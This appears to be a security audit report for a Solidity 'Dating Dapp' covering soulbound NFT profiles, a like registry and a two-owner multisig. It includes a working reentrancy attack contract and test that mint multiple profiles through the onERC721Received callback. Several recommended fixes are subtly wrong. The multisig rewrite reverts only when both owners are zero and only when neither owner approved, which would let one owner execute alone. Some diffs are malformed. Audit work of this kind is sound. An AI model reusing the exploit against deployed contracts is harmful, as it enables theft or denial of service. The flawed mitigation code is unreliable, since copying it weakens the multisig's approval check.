## About Dating Dapp

1. Dating Dapp allows users to mint a soulbound NFT as their verified dating profile.
2. Like someone's profile for a cost of 1 ETH - *to express interest*
3. If the like is mutual:-
    - **All previous payments - 10%** fee added to a shared multisig wallet for both to use on the first date.

### Questions
1. Do we allow multiple matches with different other users? or matching is 1:1?

### Assumptions
1. Say 2 profiles A & B have matched. If profile A liked 1 other profile i.e. B, and profile B liked 4 profiles (A included), profile A's balance is 1 ETH and profile B's balance is 4 ETH. Total rewards after matching (before fees) is 5 ETH to be used during the first date. User B spends less than User A.
2. Spending on the date after succesfsul match is not in the scope of the contract yet hence not part of the audit.

### Test Coverage
Quite poor.


| File                        | % Lines        | % Statements   | % Branches    | % Funcs       |
|----------------------------|----------------|----------------|---------------|---------------|
| src/LikeRegistry.sol        | 0.00% (0/34)   | 0.00% (0/34)   | 0.00% (0/15)  | 0.00% (0/5)   |
| src/MultiSig.sol            | 0.00% (0/32)   | 0.00% (0/34)   | 0.00% (0/23)  | 0.00% (0/5)   |
| src/SoulboundProfileNFT.sol | 93.94% (31/33) | 96.55% (28/29) | 55.56% (5/9)  | 83.33% (5/6)  |
| **Total**                   | **31.31%** (31/99) | **28.87%** (28/97) | **10.64%** (5/47) | **31.25%** (5/16) |


## FINDINGS

### [H-1] Reentrancy Attack

The `SoulboundProfileNFT::mintProfile` is vulnerable to some form of reentrancy attack because minting `_safeMint(msg.sender, tokenId);` happens before storing on chain i.e.

<details>
<summary> SoulboundProfileNFT::mintProfile file.</summary>

```javascript
   /// @notice Mint a soulbound NFT representing the user's profile.
    function mintProfile(string memory name, uint8 age, string memory profileImage) external {
        require(profileToToken[msg.sender] == 0, "Profile already exists");

        uint256 tokenId = ++_nextTokenId;
        // minting done first
@>      _safeMint(msg.sender, tokenId);

        // Store metadata on-chain
        // on-chain storage done here
        _profiles[tokenId] = Profile(name, age, profileImage);
        profileToToken[msg.sender] = tokenId;

        emit ProfileMinted(msg.sender, tokenId, name, age, profileImage);
    }
```
</details>

A user can misuse the contract by creating multiple profiles as many times as they want potentially **DoS**-ing the contract.

#### Proof Of Code

An attacker craetes a contract to exploit this vulnerability. Since the `SoulboundProfileNFT` uses `_safeMint`, which calls `onERC721Received` on the recipient if the recipient is a contract. This can be exploited by "recursively" called as many times as the attacker wants.

**IMPORTANT** Note the console log statement in the Attacker contract

<details>
<summary> Attack contract code.</summary>

```javascript
contract ReentrancyAttack {
    SoulboundProfileNFT public target;
    string public s_name = "EvilUser";
    uint8 public s_age = 99;
    string public s_image = "ipfs://malicious";

    uint256 public reentryCount;
    uint256 public maxReentries = 3; // To limit attack loop

    constructor(address _target) {
        target = SoulboundProfileNFT(_target);
    }

    function attack() external {
        s_name = string(abi.encodePacked(s_name, (reentryCount)));
        target.mintProfile(s_name, s_age, s_image);
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external returns (bytes4) {
        reentryCount++;
        console.log("REENTRY COUNT:", reentryCount);
        if (reentryCount < maxReentries) {
            target.mintProfile(s_name, s_age, s_image);
        }

        return this.onERC721Received.selector;
    }
}
```
</details>

The test below proves that the contract can be exploited with a ***reentrancy attack***.

<details>
<summary> ReentrancyAttackTest</summary>

```javascript
contract ReentrancyAttackTest is Test {
    SoulboundProfileNFT public target;
    ReentrancyAttack public attacker;

    function setUp() public {
        target = new SoulboundProfileNFT();
        attacker = new ReentrancyAttack(address(target));
    }

    function testReentrancyAttackSucceeds() public {
        attacker.attack();
    }
}
```
</details>

This is a simple way to prove reentrancy occurs. The reentrancy cap is deliberately set to three to limit the number of attacks for test purposes. In a real world scenario an attacker can choose not set the limits potentially DoS-ing the contract.

#### Recommended Mitigation
In `SoulboundProfileNFT::mintProfile`, mint the profile after storing the profile on-chain.

<details>
<summary> SoulboundProfileNFT::mintProfile file.</summary>

```diff
function mintProfile(string memory name, uint8 age, string memory profileImage) external {
    // @audit gas - create and error for this and use if-revert
    require(profileToToken[msg.sender] == 0, "Profile already exists");

    uint256 tokenId = ++_nextTokenId;
-   _safeMint(msg.sender, tokenId);
+   _profiles[tokenId] = Profile(name, age, profileImage);
+   profileToToken[msg.sender] = tokenId;

    // Store metadata on-chain
-   _profiles[tokenId] = Profile(name, age, profileImage);
-   profileToToken[msg.sender] = tokenId;
+   _safeMint(msg.sender, tokenId);

    emit ProfileMinted(msg.sender, tokenId, name, age, profileImage);
}
```
</details>

To be double sure, it's a good idea to add reentrancy guards e.g. `ReentrancyGuard` from openzeppelin.

<details>
<summary> SoulboundProfileNFT::mintProfile file.</summary>

```diff
# imports
+import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

+contract SoulboundProfileNFT is ERC721, Ownable, ReentrancyGuard {
-contract SoulboundProfileNFT is ERC721, Ownable {
    # contract code
+    function mintProfile(string memory name, uint8 age, string memory profileImage) external nonReentrant {
-    function mintProfile(string memory name, uint8 age, string memory profileImage) external {
        // @audit gas - create and error for this and use if-revert
        require(profileToToken[msg.sender] == 0, "Profile already exists");

        uint256 tokenId = ++_nextTokenId;
-       _safeMint(msg.sender, tokenId);
+       _profiles[tokenId] = Profile(name, age, profileImage);
+       profileToToken[msg.sender] = tokenId;

        // Store metadata on-chain
-       _profiles[tokenId] = Profile(name, age, profileImage);
-       profileToToken[msg.sender] = tokenId;
+       _safeMint(msg.sender, tokenId);

        emit ProfileMinted(msg.sender, tokenId, name, age, profileImage);
}
```
</details>

The `nonReentrant` modifier ensures that the `mintProfile` function cannot be re-entered before the first execution completes, thus preventing reentrancy attacks.

### [H-2] Reentrancy Attack

The `SoulboundProfileNFT::blockProfile` is vulnerable to some form of reentrancy attack because minting `_burn(tokenId);` happens before updating state changes i.e. deleting the profiles.

Since blocking a profile is an action that only the app owner can perform; note the `onlyOwner` modifier, a reentrancy attack surface is minimized.

<details>
<summary> SoulboundProfileNFT::mintProfile file.</summary>

```javascript
function blockProfile(address blockAddress) external onlyOwner {
    uint256 tokenId = profileToToken[blockAddress];
    // @audit gas - create and error for this and use if-revert
    require(tokenId != 0, "No profile found");

@>  _burn(tokenId);
    delete profileToToken[blockAddress];
    delete _profiles[tokenId];

    emit ProfileBurned(blockAddress, tokenId);
}
```
</details>

#### Recommended Mitigation
Though the contract might not necessarilly be prone to a reentrancy attack, it's good practice to adhere to the CEI pattern.

<details>
<summary> SoulboundProfileNFT::mintProfile file.</summary>

```diff
function blockProfile(address blockAddress) external onlyOwner {
    uint256 tokenId = profileToToken[blockAddress];
    // @audit gas - create and error for this and use if-revert
    require(tokenId != 0, "No profile found");

++  delete profileToToken[blockAddress];
++  delete _profiles[tokenId];
-    _burn(tokenId);
--  delete _profiles[tokenId];
--  delete profileToToken[blockAddress];

+    _burn(tokenId);
    emit ProfileBurned(blockAddress, tokenId);
}
```
</details>

### [H-3] Reentrancy Attack

The `SoulboundProfileNFT::burnProfile` is vulnerable to some form of reentrancy attack because minting `_burn(tokenId);` happens before updating state changes i.e. deleting the profiles.

Since blocking a profile is an action that only the app owner can perform; `require(ownerOf(tokenId) == msg.sender, "Not profile owner");` check restricts its execution to the profile owner hence a reentrancy attack surface is minimized.

<details>
<summary> SoulboundProfileNFT::burnProfile file.</summary>

```javascript
function burnProfile() external {
    uint256 tokenId = profileToToken[msg.sender];
    require(tokenId != 0, "No profile found");
    require(ownerOf(tokenId) == msg.sender, "Not profile owner");

@>  _burn(tokenId);
    delete profileToToken[msg.sender];
    delete _profiles[tokenId];

    emit ProfileBurned(msg.sender, tokenId);
}
```
</details>

#### Recommended Mitigation
Though the contract might not necessarilly be prone to a reentrancy attack, it's good practice to adhere to the CEI pattern.

<details>
<summary> SoulboundProfileNFT::burnProfile file.</summary>

```diff
function burnProfile() external {
    uint256 tokenId = profileToToken[msg.sender];
    require(tokenId != 0, "No profile found");
    require(ownerOf(tokenId) == msg.sender, "Not profile owner");

+   delete profileToToken[msg.sender];
+   delete _profiles[tokenId];

-   _burn(tokenId);
-   delete profileToToken[msg.sender];
-   delete _profiles[tokenId];

+   _burn(tokenId);
    emit ProfileBurned(msg.sender, tokenId);
}
```

<!-- ### [H-2] Reentrancy Attack 2

The `MultiSigWallet::executeTransaction` function by itself is not vulnerable to reentrancy attack because it adheres to Checks Effects and Interaction(CEI) pattern because contract state is updated before making external calls.

**But**, note that event emmission i.e.

```javascript
emit TransactionExecuted(_txId, txn.to, txn.value);
```

happens after the external call i.e.
```javascript
(bool success,) = payable(txn.to).call{value: txn.value}("");
require(success, "Transaction failed");
```

While emitting an event after the transfer isn’t inherently unsafe, the real issue is, if reentrancy occurs during the `call{value: ...}` before the logic has fully completed and before any further protective state changes, the contract can be exploited if other parts of the contract are not reentrancy-safe.

<details>
<summary> SoulboundProfileNFT::mintProfile file.</summary>

However, the txn.to address, i.e. `(bool success,) = payable(txn.to).call{value: txn.value}("");` *(which is the recipient)* is an external contract and potentially a malicious one.

The `txn.to` contract’s receive() or fallback() function could re-enter this contract, or call another function — potentially one that is not reentrancy-protected. Since your contract is still mid-execution, it might not be in a fully safe state yet.

```javascript
function executeTransaction(uint256 _txId) external onlyOwners {
    require(_txId < transactions.length, "Invalid transaction ID");
    Transaction storage txn = transactions[_txId];
    require(!txn.executed, "Transaction already executed");
    require(txn.approvedByOwner1 && txn.approvedByOwner2, "Not enough approvals");

    txn.executed = true;
    (bool success,) = payable(txn.to).call{value: txn.value}("");
    require(success, "Transaction failed");

    emit TransactionExecuted(_txId, txn.to, txn.value);
}
```
</details>

#### Proof Of Code


<details>
<summary> Attack contract code.</summary>

```javascript

```
</details>

<details>
<summary></summary>

```javascript
```
</details>


#### Recommended Mitigation


<details>
<summary></summary>

```diff

```
</details> -->

## Gas
### [G-1]
Use of require statements for error handling is not gas efficient


#### Description

In `MultiSigWallet`, `LikeRegistry` and `SoulboundProfileNFT` contracts, there is use of `require` statements for error handling. A more gas efficient way to handle this is declare errors at the top of the contract and use `if` statements to check if error causing situations occur.

**Instances**

<details>
<summary> MultiSigWallet contract</summary>

```javascript
constructor(address _owner1, address _owner2) {
@>  require(_owner1 != address(0) && _owner2 != address(0), "Invalid owner address");
@>  require(_owner1 != _owner2, "Owners must be different");
    owner1 = _owner1;
    owner2 = _owner2;
}

function approveTransaction(uint256 _txId) external onlyOwners {
@>  require(_txId < transactions.length, "Invalid transaction ID");
    Transaction storage txn = transactions[_txId];
@>  require(!txn.executed, "Transaction already executed");

    if (msg.sender == owner1) {
        if (txn.approvedByOwner1) revert AlreadyApproved();
        txn.approvedByOwner1 = true;
    } else {
        if (txn.approvedByOwner2) revert AlreadyApproved();
        txn.approvedByOwner2 = true;
    }

    emit TransactionApproved(_txId, msg.sender);
}

function executeTransaction(uint256 _txId) external onlyOwners {
@>  require(_txId < transactions.length, "Invalid transaction ID");
    Transaction storage txn = transactions[_txId];
@>  require(!txn.executed, "Transaction already executed");
@>  require(txn.approvedByOwner1 && txn.approvedByOwner2, "Not enough approvals");

    txn.executed = true;
    (bool success,) = payable(txn.to).call{value: txn.value}("");
@>  require(success, "Transaction failed");

    emit TransactionExecuted(_txId, txn.to, txn.value);
}
```
</details>

<details>
<summary> LikeRegistry contract</summary>

```javascript
function likeUser(address liked) external payable {
@>  require(msg.value >= 1 ether, "Must send at least 1 ETH");
@>  require(!likes[msg.sender][liked], "Already liked");
@>  require(msg.sender != liked, "Cannot like yourself");
@>  require(profileNFT.profileToToken(msg.sender) != 0, "Must have a profile NFT");
@>  require(profileNFT.profileToToken(liked) != 0, "Liked user must have a profile NFT");

    likes[msg.sender][liked] = true;
    emit Liked(msg.sender, liked);

    // Check if mutual like
    if (likes[liked][msg.sender]) {
        matches[msg.sender].push(liked);
        matches[liked].push(msg.sender);
        emit Matched(msg.sender, liked);
        matchRewards(liked, msg.sender);
    }
}

function matchRewards(address from, address to) internal {
    // more code on matchRewards
    (bool success,) = payable(address(multiSigWallet)).call{value: rewards}("");
@>  require(success, "Transfer failed");
}

function withdrawFees() external onlyOwner {
@>  require(totalFees > 0, "No fees to withdraw");
    uint256 totalFeesToWithdraw = totalFees;

    totalFees = 0;
    (bool success,) = payable(owner()).call{value: totalFeesToWithdraw}("");
@>  require(success, "Transfer failed");
}
```
</details>

<details>
<summary> SoulboundProfileNFT contract</summary>

```javascript
function mintProfile(string memory name, uint8 age, string memory profileImage) external {
    // @audit gas - create and error for this and use if-revert
@>  require(profileToToken[msg.sender] == 0, "Profile already exists");

    uint256 tokenId = ++_nextTokenId;
    _safeMint(msg.sender, tokenId);

    // Store metadata on-chain
    _profiles[tokenId] = Profile(name, age, profileImage);
    profileToToken[msg.sender] = tokenId;

    emit ProfileMinted(msg.sender, tokenId, name, age, profileImage);
}

function burnProfile() external {
    uint256 tokenId = profileToToken[msg.sender];
@>  require(tokenId != 0, "No profile found");
@>  require(ownerOf(tokenId) == msg.sender, "Not profile owner");

    _burn(tokenId);
    delete profileToToken[msg.sender];
    delete _profiles[tokenId];

    emit ProfileBurned(msg.sender, tokenId);
}

function blockProfile(address blockAddress) external onlyOwner {
    uint256 tokenId = profileToToken[blockAddress];
    // @audit gas - create and error for this and use if-revert
@>  require(tokenId != 0, "No profile found");

    _burn(tokenId);
    delete profileToToken[blockAddress];
    delete _profiles[tokenId];

    emit ProfileBurned(blockAddress, tokenId);
}
```
</details>

#### Recommended Mitigation


<details>
<summary> MultiSigWallet contract</summary>

```diff
// declare errors here
error InvalidOwnerAddress();
error TwoDistinctOwnersMustSign();
error InvalidTransactinoId();
error TransactionAlreadyExecuted();
error NotEnoughApprovals();
error TransactionFailed();

constructor(address _owner1, address _owner2) {
-   require(_owner1 != address(0) && _owner2 != address(0), "Invalid owner address");
+   if(_owner1 == address(0) && _owner2 == address(0)) {
+       revert InvalidOwnerAddress();
+   }
-   require(_owner1 != _owner2, "Owners must be different");
+   if(_owner1 == _owner2) {
+       revert TwoDistinctOwnersMustSign();
+   }
    owner1 = _owner1;
    owner2 = _owner2;
}

function approveTransaction(uint256 _txId) external onlyOwners {
-   require(_txId < transactions.length, "Invalid transaction ID");
+   if(_txId >= transactions.length) {
+       revert InvalidTransactinoId();
+   }
    Transaction storage txn = transactions[_txId];
-   require(!txn.executed, "Transaction already executed");
+   if(txn.executed) {
+       revert TransactionAlreadyExecuted();
+   }
    if (msg.sender == owner1) {
        if (txn.approvedByOwner1) revert AlreadyApproved();
        txn.approvedByOwner1 = true;
    } else {
        if (txn.approvedByOwner2) revert AlreadyApproved();
        txn.approvedByOwner2 = true;
    }

    emit TransactionApproved(_txId, msg.sender);
}

function executeTransaction(uint256 _txId) external onlyOwners {
-   require(_txId < transactions.length, "Invalid transaction ID");
+   if(_txId >= transactions.length) {
+       revert InvalidTransactinoId();
+   }
    Transaction storage txn = transactions[_txId];
-   require(!txn.executed, "Transaction already executed");
+   if(txn.executed) {
+       revert TransactionAlreadyExecuted();
+   }
-   require(txn.approvedByOwner1 && txn.approvedByOwner2, "Not enough approvals");
+   if(!txn.approvedByOwner1 && !txn.approvedByOwner2) {
+       revert NotEnoughApprovals();
+   }
    txn.executed = true;
    (bool success,) = payable(txn.to).call{value: txn.value}("");
-   require(success, "Transaction failed");
+   if(!success) {
+       revert TransactionFailed();
+   }
    emit TransactionExecuted(_txId, txn.to, txn.value);
}
```
</details>

<details>
<summary> LikeRegistry contract</summary>

```diff
// declare errors here
error MustSendOneEth();
error ProfileAlreadyLiked();
error CannotLikeOwnProfile();
error LikerMustAlreadyHaveAProfile();
error LikedUserMustAlreadyHaveAProfile();
error NotEnoughFundsToWithdraw();
error TransactionFailed();

function likeUser(address liked) external payable {
-  require(msg.value >= 1 ether, "Must send at least 1 ETH");
+  if(msg.value < 1 ether) {
+      revert MustSendOneEth();
+  }

-  require(!likes[msg.sender][liked], "Already liked");
+  if(likes[msg.sender][liked]) {
+      revert ProfileAlreadyLiked();
+  }

-  require(msg.sender != liked, "Cannot like yourself");
+  if(msg.sender == liked) {
+      revert CannotLikeOwnProfile();
+  }

-  require(profileNFT.profileToToken(msg.sender) != 0, "Must have a profile NFT");
+  if(profileNFT.profileToToken(msg.sender) == 0) {
+      revert LikerMustAlreadyHaveAProfile();
+  }

-  require(profileNFT.profileToToken(liked) != 0, "Liked user must have a profile NFT");
+  if(profileNFT.profileToToken(liked) == 0) {
+      revert LikedUserMustAlreadyHaveAProfile();
+  }

    likes[msg.sender][liked] = true;
    emit Liked(msg.sender, liked);

    // Check if mutual like
    if (likes[liked][msg.sender]) {
        matches[msg.sender].push(liked);
        matches[liked].push(msg.sender);
        emit Matched(msg.sender, liked);
        matchRewards(liked, msg.sender);
    }
}

function matchRewards(address from, address to) internal {
    // more code on matchRewards
    (bool success,) = payable(address(multiSigWallet)).call{value: rewards}("");
-   require(success, "Transfer failed");
+  if(!success) {
+      revert TransactionFailed();
+  }
}

function withdrawFees() external onlyOwner {
-   require(totalFees > 0, "No fees to withdraw");
+  if(totalFees == 0) {
+      revert NotEnoughFundsToWithdraw();
+  }
    uint256 totalFeesToWithdraw = totalFees;

    totalFees = 0;
    (bool success,) = payable(owner()).call{value: totalFeesToWithdraw}("");
-   require(success, "Transfer failed");
+  if(!success) {
+      revert TransactionFailed();
+  }
}
```
</details>

```diff
// declare errors here
error ProfileAlreadyExists();
error ProfileNotFound();
error CannotLikeOwnProfile();
error LikerMustAlreadyHaveAProfile();
error LikedUserMustAlreadyHaveAProfile();
error NotEnoughFundsToWithdraw();
error TransactionFailed();

function mintProfile(string memory name, uint8 age, string memory profileImage) external {
    // @audit gas - create and error for this and use if-revert
-   require(profileToToken[msg.sender] == 0, "Profile already exists");
+   if(profileToToken[msg.sender] != 0) {
+       revert ProfileAlreadyExists();
+   }

    uint256 tokenId = ++_nextTokenId;
    _safeMint(msg.sender, tokenId);

    // Store metadata on-chain
    _profiles[tokenId] = Profile(name, age, profileImage);
    profileToToken[msg.sender] = tokenId;

    emit ProfileMinted(msg.sender, tokenId, name, age, profileImage);
}

function burnProfile() external {
    uint256 tokenId = profileToToken[msg.sender];
-   require(tokenId != 0, "No profile found");
+   if(tokenId == 0) {
+       revert ProfileNotFound();
+   }

    _burn(tokenId);
    delete profileToToken[msg.sender];
    delete _profiles[tokenId];

    emit ProfileBurned(msg.sender, tokenId);
}

function blockProfile(address blockAddress) external onlyOwner {
    uint256 tokenId = profileToToken[blockAddress];
-   require(tokenId != 0, "No profile found");
+   if(tokenId == 0) {
+       revert ProfileNotFound();
+   }

    _burn(tokenId);
    delete profileToToken[blockAddress];
    delete _profiles[tokenId];

    emit ProfileBurned(blockAddress, tokenId);
}
```
</details>

## Information

### [I-1]
The contracts `src/LikeRegistry.sol`, `src/MultiSig.sol` and `src/SoulboundProfileNFT.sol` use solidity version `^0.8.19` that has some known servere issues like:-

- VerbatimInvalidDeduplication
- FullInlinerNonExpressionSplitArgumentEvaluationOrder
- MissingSideEffectsOnSelectorAccess.

#### Recommended Mitigation
use later solidity versions like `0.8.23` that has patched fixes for these issues.

### [I-2]
The contracts `LikeRegistry::profileNFT` should be set to immutable because it's not changed anywhere else after deployment. Immutable variables are also more gas efficient.

#### Recommended Mitigation
Make `LikeRegistry::profileNFT` immutable i.e.

```javascript
contract LikeRegistry is Ownable {
    struct Like {
        address liker;
        address liked;
        uint256 timestamp;
    }

    SoulboundProfileNFT public immutable profileNFT;
    // more contract code
}
```

### [I-3]
The documentation states that each profile like costs `1 eth` but the require statement in `LikeRegistry::likeUser`, i.e. `require(msg.value >= 1 ether, "Must send at least 1 ETH");` checks that `msg.value` must be greater or equal to `1 ether`.

#### Question
Specify which is right.
